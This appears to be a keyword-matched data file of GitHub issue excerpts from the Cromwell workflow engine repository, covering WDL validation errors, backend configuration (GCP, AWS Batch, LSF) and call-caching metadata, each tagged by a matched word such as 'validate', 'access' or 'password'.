Security,"Hello Cromwell Team, . I've updated a prior pull request: https://github.com/broadinstitute/cromwell/pull/6225 in order to support shared-vpc (https://cloud.google.com/vpc/docs/shared-vpc) in GCP. The changes include _shared-project-id_ and _shared-region_ parameters in order to form a Subnetwork label. Since the parameters depend on other some validations checks were updated.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6465:347,validat,validations,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6465,1,['validat'],['validations']
Security,"Hello! I used this snippet of code successfully on the Cromwell with Google backend:. ```; task fastqc {; input {; File f1; File? f2; Int? cpu=1; Int? machine_mem_gb; Int? preemptible_attempts; String mode. Float f2size = if (mode == ""PE"") then size(f2, ""GB"") else 0.0; Int disk_space_gb = ceil(size(f1, ""GB"") + f2size) + 20; }. command {; fastqc -t ~{cpu} --outdir $PWD ~{f1} ~{f2}; }. output {; Array[File] html = glob(""*html""); Array[File] zip = glob(""*zip""); }. runtime {; docker: ""biocontainers/fastqc:v0.11.5_cv2""; memory: select_first([machine_mem_gb, 4]) + "" GB""; cpu: cpu; disks: ""local-disk "" + disk_space_gb + "" HDD""; preemptible: select_first([preemptible_attempts, 3]); }; }; ```; On local backend I got this error:; _Failed to evaluate input '__disk_space_gb' (reason 1 of 1): Sorry! Operation + is not supported on empty optional values. You might resolve this using select_first([optional, default]) to guarantee that you have a filled value._. I tried following the advice (even though I don't see what is missing); Float f2size = select_first([if (mode == ""PE"") then size(f2, ""GB"") else 0.0]); And then I got an even more confusing error:; _Failed to process task definition 'fastqc' (reason 1 of 1): Failed to process expression 'select_first([f2size, select_first([if (mode == ""PE"") then size(f2, ""GB"") else 0.0])])' (reason 1 of 1): Invalid parameter 'ArrayLiteral(Vector(TernaryIf(Equals(IdentifierLookup(mode),StringLiteral(PE)),Size(IdentifierLookup(f2),Some(StringLiteral(GB))),PrimitiveLiteralExpressionElement(WomFloat(0.0)))))'. Expected an array of optional values (eg 'Array[X?]') but got 'Array[Float]+'_. Can you help me understand? It all passes Womtools validation.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5694:1688,validat,validation,1688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5694,1,['validat'],['validation']
Security,"Hello, I am new to WDL and have met the same problem recently. I defined a `struct` like this:; ```; struct Fastp {; File reportHtml; File reportJson; Array[File]+ fqs; }; ```; and try to return it as the output in a `task`:; ```; output {; Fastp out = {; ""reportHtml"": ""QC/fastp.html"",; ""reportJson"": ""QC/fastp.json"",; ""fqs"": if flag then [""QC/clean_1.fq.gz"",""QC/clean_2.fq.gz""] else [""QC/clean_1.fq.gz""]; }; }; ```; `womtool validate` was applied to check the language specification and everything went fine, but finally got the error when trying to run my workflow using Cromwell. Here is part of the error report:; ```; java.lang.UnsupportedOperationException: Cannot construct WomMapType(WomStringType,WomAnyType) with mixed types in map values: [WomString(QC/fastp.html), WomString(QC/fastp.json), [""QC/clean_1.fq.gz"", ""QC/clean_2.fq.gz""]]; ``` ; Any solution to this problem now?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-885644093:427,validat,validate,427,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4663#issuecomment-885644093,1,['validat'],['validate']
Security,"Hello, I am running Cromwell 36 configured with the GCS/JES backend to run jobs on GCP. When running massive batches of workflows, I frequently encounter the IP-address quota from Google. To avoid this, I've reconfigured my default VPC to allow private google access (see #1325). I've added the following to my Cromwell configuration (other unrelated configuration entries removed):; ```; backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; default-runtime-attributes {; noAddress: true; }; }; }; }; }; ```. This appears to have the desired effect, as my instances are now launching without an external IP, however, the jobs end up failing because docker cannot fetch the image `stedolan/jq` (as it resides on docker hub). Is there a way to configure Cromwell to use a different image for that pipeline action?. I could reconfigure the VPC to allow access to docker(hub), but that would require connecting a NAT instance which would increase the cost of using Cromwell. ---. Edit: Cromwell 36. Sorry!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676:260,access,access,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676,2,['access'],['access']
Security,"Hello, I posted this bug because the validator does NOT do a check. IE I run the validator on every WDL I submit, but the validator did not catch this error. The error happens, as you said, after many tasks have run already.; [wot.wdl.txt](https://github.com/broadinstitute/cromwell/files/2168605/wot.wdl.txt)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402886702:37,validat,validator,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3863#issuecomment-402886702,3,['validat'],['validator']
Security,"Hello,. I am having a problem that has been already discussed but I haven't been able to solve it using the suggestions. Basically, In the wdl workflow, I have two tasks (at the moment). The first works fine but the second is not starting because the output of the first task cannot be 'linked' or 'copied'. This cause the workflow to fail. The interesting part is that in the input folder of the second task there are two subfolders: 1 is empty named as `13016223` and the other is not accessible `-1976550098`. The workflow to run needs installed:; `cutadapt` and the script named `moveBarcodeToID.pl` that can be downloaded from here:. https://drive.google.com/open?id=1AizxTwjOEhL5XA7rsx-wbY97p0duB1nw. input fastq files can be retrieved here (they are small ~10000 reads each):. https://drive.google.com/file/d/1-c14Tja4zY3lyr6icFWT06stznR_-Zqr/view?usp=sharing; https://drive.google.com/file/d/1oJd_U9MjTllL0_kpNivw8I_LtSyvqpXH/view?usp=sharing. How can I solve this issue and make the workflow running smoothly?. ### Which backend are you running? ; I am running locally the workflow for now (because I am in the first phase of the development). ### Workflow is this:; ```; #workflow validated before running with: wdltool validate example.wdl and womtool validate scMeth_v2.wdl.sh -i scMeth_input_3.json. workflow scMeth {; # information for trimming the cell barcode; File command; Int bases; File input_fastq1; File input_fastq2; String sampleName. # information for trimming the adapters and low quality reads; File file_format; Int low_quality_cutoff; Int read_length_cutoff; String adapters_1; String adapters_2; Int trim_start_R1; Int trim_end_R1; Int trim_start_R2; Int trim_end_R2; String TAG; call trimCellBarcode {; input:; sampleName=sampleName,; bases=bases,; input_fastq1=input_fastq1,; input_fastq2=input_fastq2,; command=command; }; call trimAdapters {; input:; file_format=file_format,; input_r1 = trimCellBarcode.fastq_debarcoded_R1,; input_r2 = trimCellBarcode.fastq_debarcod",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:487,access,accessible,487,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['access'],['accessible']
Security,"Hello,. I found that womtool validate can't ignore ""#"" in json file and will report 'Unexpected input provided'. I think this is a bug in womtool? Example listed below. The ""#ValidateBamsWf.ValidateBAM.machine_mem_gb"" line should be ignored as it starts with a ""#""?. ```; #all files downloaded from latest github version at https://github.com/gatk-workflows/seq-format-validation.git; java -jar womtool-48.jar validate validate-bam.wdl -i validate-bam.inputs.json . ```. > WARNING: Unexpected input provided: #ValidateBamsWf.ValidateBAM.machine_mem_gb (expected inputs: [ValidateBamsWf.ValidateBAM.disk_space_gb, ValidateBamsWf.gatk_docker_override, ValidateBamsWf.ValidateBAM.validation_mode, ValidateBamsWf.gatk_path_override, ValidateBamsWf.ValidateBAM.machine_mem_gb, ValidateBamsWf.bam_array]); > WARNING: Unexpected input provided: #ValidateBamsWf.ValidateBAM.validation_mode (expected inputs: [ValidateBamsWf.ValidateBAM.disk_space_gb, ValidateBamsWf.gatk_docker_override, ValidateBamsWf.ValidateBAM.validation_mode, ValidateBamsWf.gatk_path_override, ValidateBamsWf.ValidateBAM.machine_mem_gb, ValidateBamsWf.bam_array]); ......",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5434:29,validat,validate,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5434,29,"['Validat', 'validat']","['ValidateBAM', 'ValidateBamsWf', 'validate', 'validate-bam', 'validation']"
Security,"Hello,. I wonder if it is possible to specify the GCP Batch task scheduling policy via Cromwell configuration. In specific, can I set `taskCountPerNode` to be `1` to enforce one job per VM (as in https://cloud.google.com/batch/docs/reference/rest/v1/projects.locations.jobs#taskgroup)?. Sincerely,; Yiming. <!--; Hi! Thanks for taking the time to report feedback. Please check whether your question is already answered in our:; Documentation http://cromwell.readthedocs.io/en/develop/; Bioinformatics Stack Exchange https://bioinformatics.stackexchange.com/search?q=cromwell; Slack https://join.slack.com/t/cromwellhq/shared_invite/zt-dxmmrtye-JHxwKE53rfKE_ZWdOHIB4g; -->. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7521:930,PASSWORD,PASSWORDS,930,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7521,1,['PASSWORD'],['PASSWORDS']
Security,"Hello,. I'm running a Cromwell service as Google Cloud VM instance. The Cromwell's version is 68, with the following conf:. ```; include required(classpath(""application"")). webservice {; interface = xx.xxx.xxx.xx; port = xxxx; }. google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""gred-cumulus-sb-01-991a49c4""; }. }; }. workflow-options {; workflow-log-temporary = false; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; 	url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; 	user = ""root""; 	password = ""cromwell""; 	connectionTimeout = 5000; }; }. backend {; default = PAPIv2. providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; # Google project; project = ""gred-cumulus-sb-01-991a49c4"". # Base bucket for workflow executions; root = ""gs://gred-cumulus-output/cromwell_execution"". virtual-private-cloud {; network-label-key = ""my-private-network""; subnetwork-label-key = ""my-private-subnetwork""; auth = ""application-default""; }. # Make the name of the backend used for call caching purposes insensitive to the PAPI version.; name-for-call-caching-purposes: PAPI. # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; slow-job-warning-time: ""24 hours"". # Set this to the lower of the two values ""Queries per 100 seconds"" and ""Queries per 100 seconds per user"" for; # your project.; #; # Used to help determine maximum throughput to the Google Genomics API. Setting this value too low will; # cause a drop in performance. Setting this value too high will cause QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Querie",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:777,password,password,777,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['password'],['password']
Security,"Hello,. I'm using Cromwell with Google Pipelines as backend and sometimes (maybe when more than 30 analysis running at same time) I'm getting workflow error (~2 of the 30). When inspecting the metadata for the workflow I can see a error message that contains ""ServiceException: 401 Requester pays bucket access requires authentication."". **Edit:** Using Cromwell 35. Has anyone had a similar problem? Here are the WDL task that are affected (from Broad's five dollar genome workflow):. ```wdl; task BaseRecalibrator {; File input_bam; File input_bam_index; String recalibration_report_filename; Array[String] sequence_group_interval; File dbSNP_vcf; File dbSNP_vcf_index; Array[File] known_indels_sites_VCFs; Array[File] known_indels_sites_indices; File ref_dict; File ref_fasta; File ref_fasta_index; Int disk_size; Int preemptible_tries. command {; /usr/gitc/gatk4/gatk-launch --javaOptions ""-XX:GCTimeLimit=50 -XX:GCHeapFreeLimit=10 -XX:+PrintFlagsFinal \; -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintGCDetails \; -Xloggc:gc_log.log -Xms4000m"" \; BaseRecalibrator \; -R ${ref_fasta} \; -I ${input_bam} \; --useOriginalQualities \; -O ${recalibration_report_filename} \; -knownSites ${dbSNP_vcf} \; -knownSites ${sep="" -knownSites "" known_indels_sites_VCFs} \; -L ${sep="" -L "" sequence_group_interval}; }; runtime {; docker: ""us.gcr.io/broad-gotc-prod/genomes-in-the-cloud:2.3.2-1510681135""; memory: ""6 GB""; disks: ""local-disk "" + disk_size + "" HDD""; preemptible: preemptible_tries; }; output {; File recalibration_report = ""${recalibration_report_filename}""; }; }; ```. And here is my cromwell server config:. ```scala; include required(classpath(""application"")). webservice {; port = 8000; }. system {; workflow-restart = true; }. engine {; filesystems {. gcs {; auth = ""service-account""; }. http {}. local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; }; }; }. backend {; default = ""Local""; providers {. Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBack",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336:304,access,access,304,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336,2,"['access', 'authenticat']","['access', 'authentication']"
Security,"Hello,. It seems to me that cromwell (at least `cromwell-37.jar`) can run `version 1.0` WDL scripts. Would you confirm this? It would also be helpful if you had this info readily on the ReadTheDocs page (https://github.com/broadinstitute/cromwell/blob/develop/docs/LanguageSupport.md). Thank you,; Azza . <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4678:1059,PASSWORD,PASSWORDS,1059,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4678,1,['PASSWORD'],['PASSWORDS']
Security,"Hello,. when I try to run my workflow using a config file using. `$ java -Dconfig.file=../config/LSF.conf cromwell.jar cromwell run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json`. I get the following message; ```; Error: Could not find or load main class cromwell.jar; Caused by: java.lang.ClassNotFoundException: cromwell.jar; ```. Without specifying a config file, the pipeline runs without any problems. ; I installed Cromwell (version 79) using conda. I also tried the following:. `$ java -Dconfig.file=../config/LSF.conf cromwell-79.jar run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json `. ```; Error: Could not find or load main class cromwell-79.jar; Caused by: java.lang.ClassNotFoundException: cromwell-79.jar; ```. I also checked where the cromwell.jar file is saved in my conda environment and tried the following:. `; java -Dconfig.file=./LSF.conf /path/to/env/share/cromwell/cromwell.jar cromwell run ../pipelines/bismark_pid.wdl -i ../pipelines/bismark_wgbs_pid.json `. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. This is the config file LSF.config:; ```; include required(classpath(""application"")). backend {. # Override the default backend.; default = LSF. # The list of providers. Copy paste the contents of a backend provider in this section; providers {; LSF {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; 	submit = ""bsub -J ${job_name} -cwd ${cwd} -o ${out} -e ${err} /usr/bin/env bash ${script}""; kill = ""bkill ${job_id}""; check-alive = ""bjobs ${job_id}""; job-id-regex = ""Job <(\\d+)>.*""; }; }; # Second backend provider would be copy pasted here!. }; }; ```. I have not much experienced with cromwell and would be very grateful for help. Thank you,; Johannes",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6796:1087,PASSWORD,PASSWORDS,1087,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6796,1,['PASSWORD'],['PASSWORDS']
Security,"Hello,; I'm using Cromwell to run a pipeline on an LSF cluster.; Depending on the input, jobs can take longer than the average case. I was therefore wondering if it is possible to increase the LSF time limit after a job fails (due to LSF time limit which has to be specified in my case).; Follow-up question: Is it possible to access the previous number of failed attempts for a job?. I saw the option to increase memory after a job fails, but not for other parameters and only for Google Cloud backends. Many thanks in advance!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6825:327,access,access,327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6825,1,['access'],['access']
Security,"Here is a slightly more general script (it assumes the lock file and saved image are in the current directory). It also does the pull into a temp file with a rename into the destination name at the end so that for a large image the -f check won't trigger for a partial download. I do some work here to deduce a filename that should match (as I understand the rules anyway) the one that the pull would create. I also include an option to force the path, since in my automation I tend to wish to define everything for my self. The derived or given image filename is echoed at the end. YOUR_HOST is the name of the sregistry host (this is the context I'm doing this in). ```; #!/bin/bash . lock_dir=. if [[ $# -ne 1 && $# -ne 2 ]] ; then; echo ""Usage: $0 image-name [output-file]"" 1>&2; exit 1; fi; name=$1; output_file=$2. if [[ ""$output_file"" = """" ]] ; then. # deduce filename . output_file=`basename $name`; if [[ $output_file =~ (.*):([^:]+)$ ]] ; then; base=${BASH_REMATCH[1]}; tag=${BASH_REMATCH[2]}; else; base=$output_file; tag=latest; fi; output_file=""${base}_$tag.sif""; fi. url=shub://YOUR_HOST/$name. # declare a very similar path (.lock) where Cromwell can access ; lock=$lock_dir/$output_file.lock; tmp=$output_file.tmp. if [ ! -f ""$output_file"" ]; then # If we already have the image, skip everything ; (; flock --exclusive 200; if [ ! -f ""$output_file"" ]; then # do a second check once the lock has been released ; singularity pull --nohttps $tmp $url; mv $tmp $output_file; fi; ) 200>$lock; fi. rm -f $lock. echo $output_file; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537238921:1166,access,access,1166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537238921,1,['access'],['access']
Security,"Here is a very simple WDL (test.wdl):; ```; version 1.0. workflow test {; input {; Array[File] list; }. call test {; input:; list = list; }; }. task test {; input {; Array[File] list; String docker = ""ubuntu:20.04""; }. File lines = write_lines(list). command <<<; cat ~{lines}; cat ~{write_lines(list)}; echo -e ""~{sep=""\\n"" list}""; >>>. runtime {; docker: docker; }; }; ```. Here is a basic input for the WDL (test.json):; ```; {; ""test.list"": [""/tmp/1"", ""/tmp/2"", ""/tmp/3""]; }; ```. When I run the workflow on my laptop with the following command:; ```; java -jar cromwell-51.jar run test.wdl -i test.json; ```; I get the following stdout output:; ```; /tmp/1; /tmp/2; /tmp/3; /cromwell-executions/test/00112233-4455-6677-8899-aabbccddeeff/call-test/inputs/1515144/1; /cromwell-executions/test/00112233-4455-6677-8899-aabbccddeeff/call-test/inputs/1515144/2; /cromwell-executions/test/00112233-4455-6677-8899-aabbccddeeff/call-test/inputs/1515144/3; /cromwell-executions/test/00112233-4455-6677-8899-aabbccddeeff/call-test/inputs/1515144/1; /cromwell-executions/test/00112233-4455-6677-8899-aabbccddeeff/call-test/inputs/1515144/2; /cromwell-executions/test/00112233-4455-6677-8899-aabbccddeeff/call-test/inputs/1515144/3; ```; Which shows that the absolute paths of the files passed to the test workflow have been exposed. I cannot imagine this being the expected behavior. How do I get to have `write_lines(...)` behave more like `~{sep="" "" ...}` even when it is not run inside a command <<< ... >>> instance?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5540:1317,expose,exposed,1317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5540,1,['expose'],['exposed']
Security,"Here is the config file used for the above. ```; ﻿include required(classpath(""application"")). ""workflow_failure_mode"": ""ContinueWhilePossible"". webservice {; port = 2525; }. system.file-hash-cache=true. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. database {; profile = ""slick.jdbc.MySQLProfile$""; db {; # driver = ""com.mysql.jdbc.Driver""; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://xxxxxx:xxxx/xxx?rewriteBatchedStatements=true&useSSL=false""; user = ""xxx""; password = ""xxx""; connectionTimeout = 120000; }; }. aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; {; name = ""assume-role-based-on-another""; scheme = ""assume_role""; base-auth = ""default""; role-arn = ""arn:aws:iam::xx:role/xxx""; }; ]; // diff 1:; # region = ""us-west-2"" // uses region from ~/.aws/config set by aws configure command,; # // or us-east-1 by default; }; engine {; filesystems {; s3 {; auth = ""assume-role-based-on-another""; }; }; }; backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; // Base bucket for workflow executions; root = ""s3://xxx/cromwell-output""; // A reference to an auth defined in the `aws` stanza at the top. This auth is used to create; // Jobs and manipulate auth JSONs.; auth = ""default""; // diff 2:; numSubmitAttempts = 1; // diff 3:; numCreateDefinitionAttempts = 1; default-runtime-attributes {; queueArn: ""arn:aws:batch:us-west-2:xxx:job-queue/xxx""; }; filesystems {; s3 {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""default""; }; }; }; }; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020:186,hash,hash-cache,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4805#issuecomment-480408020,2,"['hash', 'password']","['hash-cache', 'password']"
Security,"Here is the terminal output, for posterity:. The first command with internet, confirms we are using a cached image:; ```bash; $ singularity exec docker://busybox ls; INFO: Using cached SIF image; CHANGELOG.md LICENSE README.md dist paper qme.egg-info setup.py; Dockerfile MANIFEST.in build docs qme setup.cfg tests; ```; then I took off my wireless :scream: and ran the same - we know the image is in the cache:. ```bash; $ singularity exec docker://busybox ls; FATAL: Unable to handle docker://busybox uri: failed to get checksum for docker://busybox: error pinging docker registry registry-1.docker.io: Get https://registry-1.docker.io/v2/: dial tcp: lookup registry-1.docker.io: no such host; ```; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046:522,checksum,checksum,522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631206046,1,['checksum'],['checksum']
Security,"Here's a log for a similar workflow that had the same issue but recovered after restart. ```; 2017-02-13 16:50:09,104 INFO - MaterializeWorkflowDescriptorActor [UUID(3d01da76)]: Call-to-Backend assignments: test.hello -> JES; 2017-02-13 16:50:09,534 INFO - JES [UUID(3d01da76)]: Creating authentication file for workflow 3d01da76-98f9-4751-a3c0-efc61ef67030 at ; gs://cromwell-auth-broad-dsde-alpha/3d01da76-98f9-4751-a3c0-efc61ef67030_auth.json; 2017-02-13 16:50:10,063 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Starting calls: test.hello:NA:1; 2017-02-13 16:50:11,006 INFO - JesRun [UUID(3d01da76)test.hello:NA:1]: JES Run ID is operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:11,006 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: job id: operations/EJ7jhsOjKxiXht2Ej-qXrHAg9vy4-dodKg9wcm9kdWN0aW9uUXVldWU; 2017-02-13 16:50:16,621 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from - to Initializing; 2017-02-13 16:51:01,890 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Initializing to Running; 2017-02-13 16:51:38,243 INFO - JesAsyncBackendJobExecutionActor [UUID(3d01da76)test.hello:NA:1]: JesAsyncBackendJobExecutionActor [UUID(3d01da76):test.hello:NA:1] Status change from Running to Success; 2017-02-13 16:51:38,977 INFO - WorkflowExecutionActor-3d01da76-98f9-4751-a3c0-efc61ef67030 [UUID(3d01da76)]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""gs://fc-cd1f5468-d0f9-4416-8cdc-9464482022dd/8ee1f938-a92c-48df-a4cc-7a0683413547/test/3d01da76-98f9-4751-a3c0-efc61ef67030/call-hello/hello-stdout.log""; }; 2017-02-13 16:51:39,178 INFO - $f [UUID(3d01da76)]: Copying workflow logs from /cromwell-workflow-logs/workflow.3d01da76-98f9-4751-a3c0-efc61ef",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953:288,authenticat,authentication,288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1978#issuecomment-279495953,1,['authenticat'],['authentication']
Security,"Here's another repro. We had a new database whose firewall wasn't set up to let this particular Cromwell instance talk to it. Cromwell starts up and appears to be running but there isn't any mention in the log that there's a problem - and we don't get to the ""Running with database"" <connection string> log line. It just quietly fails.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-231123371:50,firewall,firewall,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1128#issuecomment-231123371,1,['firewall'],['firewall']
Security,"Here's the metadata; ```; {; ""workflowName"": ""MarkDuplicates"",; ""calls"": {; ""MarkDuplicates.SortSam"": [; {; ""executionStatus"": ""Done"",; ""backendStatus"": ""Success"",; ""shardIndex"": -1,; ""jes"": {; ""instanceName"": ""ggp-8929414080671740740"",; ""machineType"": ""us-east1-d/n1-highmem-4"",; ""zone"": ""us-east1-d""; },; ""outputs"": {; ""outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-SortSam/md.sorted.bam""; },; ""callCaching"": {; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""727DC68A78243A55A510496DBD51C8FD"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File outBam"": ""51E81723BF4AE3737FA7A05AD3C404E0""; },; ""input count"": ""A87FF679A2F3E71D9181A67B7542122C"",; ""backend name"": ""5BAA79C7C5A573C899A61D342AA00484"",; ""command template"": ""7F303905B5A7C3C5E133EEA5D655F93F"",; ""input"": {; ""String docker"": ""5FFD9AB91DECDD52945847CAED219F0A"",; ""String outputName"": ""A3830295D56B220883B7627EB49D6ECD"",; ""String sortOrder"": ""D68E1AF2DA2A70598DD21717D8621A4C"",; ""File bam"": ""WRKp1w==""; }; }; },; ""returnCode"": 0,; ""end"": ""2018-04-04T06:49:15.680Z"",; ""dockerImageUsed"": ""us.gcr.io/broad-gatk/gatk@sha256:fd8e7a9e65e6a981ab3b92305492d54c3baef7a803ec3fcb895e5ebeedf824e7"",; ""attempt"": 1,; ""executionEvents"": [; {; ""startTime"": ""2018-04-04T03:54:17.587Z"",; ""description"": ""Pending"",; ""endTime"": ""2018-04-04T03:54:17.587Z""; },; {; ""startTime"": ""2018-04-04T06:49:04.424457737Z"",; ""description"": ""cromwell poll interval"",; ""endTime"": ""2018-04-04T06:49:12.726Z""; },; {; ""startTime"": ""2018-04-04T06:49:12.726Z"",; ""description"": ""UpdatingCallCache"",; ""endTime"": ""2018-04-04T06:49:14.698Z""; },; {; ""startTime"": ""2018-04-04T03:54:17.588Z"",; ""description"": ""PreparingJob"",; ""endTime"": ""2018-04-04T03:54:17.593Z""; },; {; ""startTime"": ""2018-04-04T06:35:13.639652324Z"",; ""description"": ""delocalizing-files"",; ""endTime"": ""2",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:482,hash,hashes,482,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['hash'],['hashes']
Security,Here's the pullapprove audit: https://pullapprove.com/broadinstitute/cromwell/pull-request/3505/reviews/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3505#issuecomment-382572389:23,audit,audit,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3505#issuecomment-382572389,1,['audit'],['audit']
